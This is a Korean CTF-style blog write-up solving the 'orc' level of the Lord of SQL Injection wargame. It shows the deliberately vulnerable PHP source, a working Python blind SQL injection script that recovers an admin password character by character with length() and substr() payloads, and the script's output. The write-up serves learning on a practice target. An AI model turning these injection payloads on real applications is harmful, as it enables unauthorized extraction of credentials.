---
title: "[Lord of SQL Injection] LoS - orc 문제풀이"
date: 2018-07-23
draft: false
category: [wargame]
subcategories: [lord-of-sql-injection]
tags: [Write-up, Lord of SQL Injection]
---

하루에 한 문제씩 `los` 문제를 풀어보는 중이다.
다음 문제의 이름은 `orc`이다.  

<!--more-->

코드는 다음과 같다.  

```php
-------------------------------------------------------------------------------
query : select id from prob_orc where id='admin' and pw=''
-------------------------------------------------------------------------------

<?php 
  include "./config.php"; 
  login_chk(); 
  dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  $query = "select id from prob_orc where id='admin' and pw='{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if($result['id']) echo "<h2>Hello admin</h2>"; 
   
  $_GET[pw] = addslashes($_GET[pw]); 
  $query = "select pw from prob_orc where id='admin' and pw='{$_GET[pw]}'"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("orc"); 
  highlight_file(__FILE__); 
?>
```

이번 문제에는 문제를 풀기 위해 아래의 조건문을 통과해야 한다.  

```php
if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("orc");
```

입력 한 `pw`의 값과 데이터베이스에 저장되어 있는 `pw`의 값이 같아야 한다.
즉, 정확한 `pw`의 값을 입력해야 문제를 풀 수 있다.

이 문제는 `Blind SQL Injection`으로 해결했다.
`Blind SQL Injection`은 쿼리 결과 에 따른 서버의 참과 거짓 반응을 통해 공격을 수행한다.
이에 대해 이 전 블로그에 적어둔게 있는데, 지금은 옮기기 귀찮아서 나중에 시간이 될 때 옮겨오려 한다.
문제를 풀기 위해 구현한 `exploit` 코드는 아래와 같다.  

```python
import requests

flag = ""
length = 0

url = "http://los.rubiya.kr/orc_60e5b360f95c1f9688e4f3a86c5dd494.php?pw="
session = dict(PHPSESSID = "YOUR SESSION ID")

print "[+] Start"

print "[+] Find length of the password"

for i in range(0, 20):
	try:
		query = url + "1' or id='admin' and length(pw)=" + str(i) + "%23"
		r = requests.post(query, cookies=session)
	except:
		print "[-] Error occur"
		continue

	if 'Hello admin' in r.text:
		length = i
		break

print "[+] Found length : ", length

print "[+] Find password"

for j in range(1, length + 1):
	for i in range(48, 128):
		try:
			query = url + "1' or id='admin' and substr(pw, " + str(j) + ", 1)='" + chr(i)
			r = requests.post(query, cookies=session)
		except:
			print "[-] Error occur"
			continue

		if 'Hello admin' in r.text:
			flag += chr(i)
			print "[+] Found " + str(j), ":", flag
			break

print "[+] Found password : ", flag
print "[+] End"
```

먼저 `pw`의 길이를 알아내기 위해, `length()` 함수를 사용했다.
이 경우 완성되는 쿼리는 다음과 같다.  

```mysql
select id from prob_orc where id='admin' and pw='1' or id='admin' and length(pw)=0#'
```

만약 pw의 길이가 `str(i)`의 값과 같을 경우 데이터베이스에서는 `id='admin' and length(pw)=0`의 두 조건이 모두 참이므로 `admin`의 행이 추출되어 `Hello admin`이 출력될 것이다.
길이를 찾은 다음에는 해당 길이만큼 반복문을 수행 해 `pw`를 한 글자 씩 찾았다.
`substr()`을 사용했는데, 이 경우 완성되는 쿼리는 다음과 같다.  

```mysql
select id from prob_orc where id='admin' and pw='1' or id='admin' and substr(pw, 0, 1)='0'
```

이 때도 만약 pw의 `str(j)`번 째 문자가 `chr(i)`의 값과 같을 경우 `id='admin' and substr(pw, 0, 1)='0'`의 모든 조건이 참이 되어 `admin`의 행이 추출된다.
따라서 `Hello admin`이 출력된다.
이 exploit 코드를 실행시킨 결과 다음과 같이 pw를 찾을 수 있었다.  

```bash
$ python ex.py 
[+] Start
[+] Find length of the password
[+] Found length :  8
[+] Find password
[+] Found 1 : 0
[+] Found 2 : 09
[+] Found 3 : 095
[+] Found 4 : 095A
[+] Found 5 : 095A9
[+] Found 6 : 095A98
[+] Found 7 : 095A985
[+] Found 8 : 095A9852
[+] Found password :  095A9852
[+] End
```

그런데, `095A9852`를 입력해도 `Hello admin`은 출력되지만 문제는 풀리지 않았다.
생각해보니 `MySQL`에서는 대소문자를 구분하지 않아 만약 `a`와 `A`를 비교해도 참을 반환한다는 것이 생각났다.
그래서 대문자를 소문자로 바꾸어 다시 인증했더니 문제가 풀렸다.  

```php
-------------------------------------------------------------------------------------------
query : select id from prob_orc where id='admin' and pw='095a9852'
-------------------------------------------------------------------------------------------

Hello admin
ORC Clear!
<?php 
  include "./config.php"; 
  login_chk(); 
  dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  $query = "select id from prob_orc where id='admin' and pw='{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if($result['id']) echo "<h2>Hello admin</h2>"; 
   
  $_GET[pw] = addslashes($_GET[pw]); 
  $query = "select pw from prob_orc where id='admin' and pw='{$_GET[pw]}'"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("orc"); 
  highlight_file(__FILE__); 
?>
```

---

```plain
ORC Clear!!`
```